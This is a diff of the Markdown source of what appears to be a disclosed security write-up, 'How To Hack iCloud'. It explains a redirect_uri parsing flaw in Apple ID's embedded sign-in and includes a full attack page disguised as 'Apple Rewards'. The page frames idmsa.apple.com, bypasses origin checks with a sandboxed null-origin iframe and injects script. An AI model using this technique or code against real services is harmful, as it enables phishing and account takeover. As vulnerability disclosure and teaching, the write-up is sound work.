@@ -10,12 +10,13 @@ tags:
  - disclosure
  - writing
 date: [ 13, aug, 2020 ]
+autonumber:
+    sequence: alphanumeric
+    separator: "."
+    prefix: §
 ---
 
-import { Frac, Chem } from '@zemn.me/linear';
-export const date = new Date("Thu Aug 13 2020 19:52:18 GMT+0100 (British Summer Time)")
-
-How To Hack iCloud
+How To Hack iCloud {#how-to-hack-icloud}
 ==================
 
 [How To Hack iCloud]: #how-to-hack-icloud
@@ -129,7 +130,7 @@ Just a few minutes attention from some Project Zero guys is worth tens of
 thousands of dollars if I could only tempt them with my fine selection of bounty
 shirts and glass tumblers with company logos.
 
-The Very Worst Thing {#the_very_worst_thing}
+II. The Very Worst Thing {#the_very_worst_thing}
 --------------------------------------------
 
 [The Very Worst Thing]: #the_very_worst_thing
@@ -303,27 +304,29 @@ ID, in this case iCloud and they are not usually interchangable. I couldn't,
 then, if this were implemented correctly take your iMessage authentication token
 and use it to get into your iCloud.
 
-`response_type=code` is an OAuth specific parameter asking for an OAuth code
+ - `response_type=code` is an OAuth specific parameter asking for an OAuth code
 which the iCloud servers can exchange for an Apple ID credential.
 
-`redirect_uri` is also an OAuth specific concept -- of where the token (in this
+ - `redirect_uri` is also an OAuth specific concept -- of where the token (in this
 case the iCloud Apple ID authorization) goes to. But `redirect_uri` doesn't make
 sense in this concept because we're already on `icloud.com` so unless some weird
 stuff is going on I'm not expecting this frame to redirect to `icloud.com`.
 
-`response_mode=web_message` appears to be the special indicator to the Apple ID
+ - `response_mode=web_message` appears to be the special indicator to the Apple ID
 server that we don't want normal OAuth, we want an embedded page that passes us
 the token eventually. 'web message' in this case likely refers to the
 `postMessage` API which is used to securely communicate between embeds and other
 webpages.
 
-`locale` just indicates the language to show the login dialog in. `frame_id` I
+ - `locale` just indicates the language to show the login dialog in. `frame_id` I
 think is just to help differentiate cases where there may be multiple different
 embedded pages.
 
 Considering that this was a big factor in [How to Hack the UK Tax System], this
-might make me awfully predictable but the first thing I tried was sneaking an @
-into `redirect_uri`.
+might make me awfully predictable but the first thing I tried was sneaking an `@`
+into `redirect_uri`:
+
+[How to hack the UK Tax System]: https://medium.com/@Zemnmez/how-to-hack-the-uk-tax-system-i-guess-3e84b70f8b
 
 ```
 redirect_uri=https%3A%2F%2Fthomas@www.icloud.com
@@ -977,25 +980,27 @@ It's Not Always That You Need to Read The Spec, But That Always is Today.
 
 Now we have a sneaky way to push data to `idmsa.apple.com` without getting checked by the access control list. But how do we receive messages without being `icloud.com`?
 
-I noticed via live debugging that the origin that `idmsa.apple.com` was sending messages to was *not* `icloud.com`, but the full `redirect_uri`, `https://*;@icloud.com`. This is a super odd one because `postMessage` is specified like this:
+I noticed via live debugging that the origin that `idmsa.apple.com` was sending messages to was *not* `icloud.com`, but the full `redirect_uri`, `https://*;@icloud.com`. This is a super odd one because `postMessage` is specified[^1] like this:
 
 ```javascript
 targetWindow.postMessage(message, targetOrigin, [transfer]);
 ```
-(from MDN https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
 
-`targetOrigin` would indicate that what should be passed in is an HTTP web origin, which has to be very strictly specified and for which, as mentioned before `https://*;@icloud.com` is absolutely *not* valid. In theory, that'd probably just mean that the call should never be able to get to us, but I dived into the `postMessage` specification, which defines the action of `postMessage` like this:
+[^1]: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage "Window.postMessage() - Web APIs | MDN"
 
-> 1. Let `targetRealm` be `targetWindow`'s Realm.
-> 2. Let `incumbentSettings` be the incumbent settings object.
-> 3. Let `targetOrigin` be options["targetOrigin"].
-> 4. If `targetOrigin` is a single U+002F SOLIDUS character (/), then set `targetOrigin` to `incumbentSettings`'s origin.
-> 5. Otherwise, if `targetOrigin` is not a single U+002A ASTERISK character (*), then:  
-> 5a. Let `parsedURL` be the result of running the URL parser on `targetOrigin`.  
-> 5b. If `parsedURL` is failure, then throw a "SyntaxError" DOMException.
-> 6. Set `targetOrigin` to parsedURL's origin.
->
-> *** 
+`targetOrigin` would indicate that what should be passed in is an HTTP web origin, which has to be very strictly specified and for which, as mentioned before `https://*;@icloud.com` is absolutely *not* valid. In theory, that'd probably just mean that the call should never be able to get to us, but I dived into the `postMessage` specification, which defines[^2] the action of `postMessage` like this:
+
+ 1. Let `targetRealm` be `targetWindow`'s Realm.
+ 2. Let `incumbentSettings` be the incumbent settings object.
+ 3. Let `targetOrigin` be `options["targetOrigin"]`.
+ 4. If `targetOrigin` is a single U+002F SOLIDUS character (/), then set `targetOrigin` to `incumbentSettings`'s origin.
+ 5. Otherwise, if `targetOrigin` is not a single U+002A ASTERISK character (*), then:  
+    1. Let `parsedURL` be the result of running the URL parser on `targetOrigin`.  
+    2. If `parsedURL` is failure, then throw a "SyntaxError" DOMException.
+ 6. Set `targetOrigin` to parsedURL's origin.
+
+[^2]: https://html.spec.whatwg.org/multipage/web-messaging.html#posting-messages
+
 
 `targetOrigin` is *not* an origin!! `targetOrigin` is technically a URL, from which an origin is extracted. For us, this is especially useful.
 
@@ -1023,9 +1028,12 @@ I iterated over some possible options for this, and with much trial and tribulat
 
 This is a very tricky URL to construct, as it has to satisfy all systems without crashing, and it does, as follows:
 
-1. `idmsa.apple.com` backend decodes the `redirect_uri` and sees `https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com`. It (correctly) determines that the origin is `wwww.icloud.com` and allows the request through.
-2. `idmsa.apple.com` sends `frame-ancestors https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com`; To `frame-ancestors` this indicates the allowed origins `https://s3-eu-west-1.amazonaws.com%3F`, which doesn't exist and `s3-eu-west-1.amazonaws.com` which is anything we put in our S3 bucket.
-3. `idmsa.apple.com` generates `bootData.destinationDomain = decodeURIComponent('https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com)`. `bootData.destinationDomain` gets set to `https://s3-eu-west-1.amazonaws.com? s3-eu-west-1.amazonaws.com;@www.icloud.com`.
+1. The Apple ID backend at `idmsa.apple.com`
+decodes the `redirect_uri` ‘`https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com`’
+2. It (correctly) determines that the origin is `wwww.icloud.com` and allows the request through.
+2. The Apple ID backend at `idmsa.apple.com` returns the Content-Security Policy directive ‘`frame-ancestors https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com`’
+3. This indicates to the browser the allowed origins `https://s3-eu-west-1.amazonaws.com%3F`, which doesn't exist and `s3-eu-west-1.amazonaws.com` which is *anything we put in our personal S3 bucket web server*.
+3. `idmsa.apple.com` then generates `bootData.destinationDomain = decodeURIComponent('https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com)`. `bootData.destinationDomain` gets set to ‘`https://s3-eu-west-1.amazonaws.com? s3-eu-west-1.amazonaws.com;@www.icloud.com`’ when the page loads.
 4. When passed `https://s3-eu-west-1.amazonaws.com? s3-eu-west-1.amazonaws.com;@www.icloud.com` as `targetOrigin`, `postMessage` parses out `https://s3-eu-west-1.amazonaws.com` to be the correct target origin, which allows us to get `postMessage`s from our embedded `idmsa.apple.com`
 
 What's at the end of this long road? Having tricked `idmsa.apple.com` into thinking that we're iCloud, when you log in to our embed with your autofilled email we get an authentication for your Apple account. Even if you don't 2FA! This is because an authentication token is granted without passing 2FA for iCloud 'Find My', used for finding your potentially lost phone which you might need to pass 2FA.
@@ -1138,21 +1146,17 @@ Oh now this looks *really* good! From our previous code we already know that `pr
 
 Let's put everything together into one attack page.
 
-```HTML CodeCommentHelper=//!
+```HTML CodeCommentHelper=//
 <!DOCTYPE HTML>
-<!-- a sneaky title for a sneaky exploit -->
+//
 <title>Apple Rewards</title>
 <style type="text/css">
 
-/*
-//! We want to clear up any telltale signs of embedding so the
-//! user doesn't pick up on our ruse so easily.
-//!
-//! Here, we make the Apple ID iframe (defined later)
-//! fill the user's screen, and remove the telltale iframe
-//! border.
-    style to make the sneakily embedded AppleID page less obvious
-*/
+// First, we 
+// clear up any gives that there's
+// something going on by making
+// the Apple ID frame fill
+// the whole page with no border
 .idmsa-frame {
     width: 100vw;
     height: 100vh;
@@ -1163,106 +1167,95 @@ Let's put everything together into one attack page.
 
 <script>
 
-//! We want to make our 'null' origin page.
-//! it would be perfectly reasonable to do this with
-//! multiple separate HTML files, making the null origin
-//! a 'true' separate HTML page, but it's cleaner and
-//! easier to manage if we write everything as Javascript
-//! and use iframe 'htdoc' syntax to make 'synthetic'
-//! embedded pages dynamically.
-// Runs a given javascript function (given as text)
-// inside a 'null' origin.
-const runFunctionInNullOrgin = javascriptCode => {
-    const i = document.createElement("iframe");
+// Next, the null origin allows us to bypass
+// Apple ID's postMessage controls.
+// This function takes some code, and
+// runs it in the null origin.
+const runAsNull = code => {
+    const i = document.createElement(
+        "iframe"
+    );
 
-    //! the <iframe sandbox=> attribute without allow-same-origin
-    //! makes our embed have a null origin, which bypasses
-    //! Apple's HTTP origin checks. We have to allow
-    //! scripts so our code runs at all!
-    // Our code won't run without scripts!
-    i.setAttribute ("sandbox", "allow-scripts");
+    // We apply 'sandbox=allow-scripts'
+    // to the iframe. Enabling sandboxing
+    // makes our page have the 'null' origin
+    // we need to bypass Apple ID's recieve
+    // postMessage controls.
+    i.setAttribute(
+        "sandbox",
+        "allow-scripts"
+    );
 
-    //! the "srcdoc" attribute defines the html document in our
-    //! null iframe. We splice in the 'javascriptCode' parameter.
-    //!
-    //! javascriptCode is expected to be a function.
-    //! When javascript inserts a function into a string,
-    //! it turns it into its source code.
-    //!
-    //! The (function)() syntax is technically called IIFE.
-    //! it just means the function is 'immediately invoked'.
-    //! Honestly the term IIFE is more complicated than
-    //! the actual concept but it seems cool to use it.
-    i.setAttribute("srcdoc",`<!DOCTYPE HTML>
+    // Then, we create an HTML document inside our sandboxed iframe
+    // containing our javascript code.
+    //
+    // Those backtick quotes (`) are just multi-line
+    // quote marks by the way.
+    i.setAttribute(
+        "srcdoc",
+        `<!DOCTYPE HTML>
 <title>null origin</title>
 <body><script>(${javascriptCode})()<\/script></body>
-`);
+    `);
 
-    //! This is the kind of code that would probably never pass
-    //! a real code review. Appending to document.body is a
-    //! quick and dirty way to get elements into the page.
-    //! It's not always that document.body exists, so we throw
-    //! in document.documentElement just in case.
-    //!
-    //! The return value of `appendChild` is the child that
-    //! just got appended (the iframe), and we take the
-    //! contentWindow of that.
-    //!
-    //! The contentWindow represents the actual window contained
-    //! in the iframe, which is all we care about. We don't 
-    //! expect to do anything with the iframe element once it's
-    //! created.
-    return (document.body || document.documentElement)
+
+    // Appends our iframe child, which we called 'i'
+    // to the page's '<body>' element, and gets a handle
+    // on the window the browser made inside the iframe.
+    return document.body
         .appendChild(i).contentWindow;
 }
 
 
-//! This is the code we want to inject into idmsa.apple.com
-//! for now, it's just an alert() box stating document.domain.
-//! Domains and origins are the fundamental primitives of web
-//! security, so if we can open a popup showing 'idmsa.apple.com',
-//! we prove to ourselves that we've compromised Apple ID.
+// This is the code we want to inject into idmsa.apple.com.
+// For now, it's just a pop-up box that says the domain
+// that it's running in.
+//
+// Domains and origins are the fundamental primitives of web
+// security, so if we can open a popup showing 'idmsa.apple.com',
+// we prove to ourselves that we've compromised Apple ID.
 const injection = () => {
     alert(document.domain);
 }
 
 
-//! This is the page we're embedding and attacking. It needs
-//! a bunch of parmeters to work, but we'll probably want
-//! to reference those parameters a few times
-//! so it's easier to define the components of the URL separately.
-const idmsa_base = "https://idmsa.apple.com/appleauth/auth/authorize/signin";
+// This is the page we're embedding and attacking. It needs
+// a bunch of parmeters to work, but we'll probably want
+// to reference those parameters a few times
+// so it's easier to define the components of the URL separately.
+const idmsa_base =
+    "https://idmsa.apple.com/appleauth/auth/authorize/signin";
 
-//! Here are the parameters we're using against idmsa_base.
-//! defining them like this instead of one long URL
-//! makes it easier to programmatically alter these parameters
-//! if need to to work on our attack.
+// Here are the parameters we're using against idmsa_base.
+// defining them like this instead of one long URL
+// makes it easier to programmatically alter these parameters
+// if need to to work on our attack.
 const idmsa_params = {
     client_id: "d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d",
 
-    //! Here, the redirect_uri's ? is pre-urlencoded as mentioned
-    //! in previous chapters. This causes it to be misinterpreted
-    //! by different parts of the system.
+    // Here, the redirect_uri's ? is pre-urlencoded as mentioned
+    // in previous chapters. This causes it to be misinterpreted
+    // by different parts of the system.
     redirect_uri: `https://s3-eu-west-1.amazonaws.com${encodeURIComponent("?")} s3-eu-west-1.amazonaws.com;@www.icloud.com`,
     response_mode: "web_message",
     
-    //! I thought it might be possible that this frame_id
-    //! needed to change per-request, but it doesn't
-    //! so we can just hard code it :)
+    // I thought it might be possible that this frame_id
+    // needed to change per-request, but it doesn't
+    // so we can just hard code it :)
     frame_id: "9d8dafd2-0f8c-4901-ab87-7021ffa6f7ff",
     locale: "en_GB"
 }
 
-//! let's make the idmsa frame.
+// let's make the idmsa frame.
 const idmsa_frame = document.createElement("iframe");
 
-//! to inherit our CSS class from before
+// to inherit our CSS class from before
 idmsa_frame.setAttribute("class", "idmsa");
 
-//! this builds the idmsa url. I apologise for the way I build
-//! the url encoding stuff. it reads fine to me but uses
-//! a bunch of higher-level javascript concepts that
-//! might not make a  whole lot of sense.
+// this builds the idmsa url. I apologise for the way I build
+// the url encoding stuff. it reads fine to me but uses
+// a bunch of higher-level javascript concepts that
+// might not make a  whole lot of sense.
 idmsa_frame.src = `${idmsa_base}?${
     Object.entries(idmsa_params)
         .map(([key, value]) => 
@@ -1270,33 +1263,33 @@ idmsa_frame.src = `${idmsa_base}?${
         .join("&")
 }`;
 
-//! our null page needs to:
-//!   1.  Wait for a config, and remember it
-//!   2. Forward all subsequent postMessages to
-//!   idmsa.apple.com.
+// our null page needs to:
+//   1.  Wait for a config, and remember it
+//   2. Forward all subsequent postMessages to
+//   idmsa.apple.com.
 const nullPageCode = () => {
-    //! async functions can wait on asynchronous events.
-    //! since we're waiting n a bunch of asynchronous
-    //! stuff to happen it only makes sense.
+    // async functions can wait on asynchronous events.
+    // since we're waiting n a bunch of asynchronous
+    // stuff to happen it only makes sense.
     async function main() {
-        //! tell our parent we're ready.
-        //! the onLoad events for iframes have always
-        //! been finickity. Waiting on a postMessage
-        //! is much easier.
+        // tell our parent we're ready.
+        // the onLoad events for iframes have always
+        // been finickity. Waiting on a postMessage
+        // is much easier.
         window.parent.postMessage("ready", "*");
 
-        //! await lets us wait for events that might
-        //! happen in the future before continuing.
-        //! we don't want to do anything before we
-        //! get the config anyway.
-        //!
-        //! Promises make fantastic adaptors for turning
-        //! old style callbacks into async code.
+        // await lets us wait for events that might
+        // happen in the future before continuing.
+        // we don't want to do anything before we
+        // get the config anyway.
+        //
+        // Promises make fantastic adaptors for turning
+        // old style callbacks into async code.
         const config = await new Promise((ok, fail) => {
             console.log("waiting for config");
             
-            //! postMessage's event is just called 'message'
-            //! i dont really know why.
+            // postMessage's event is just called 'message'
+            // i dont really know why.
             window.addEventListener('message', ({data}) => {
                 console.log("got config message");
 
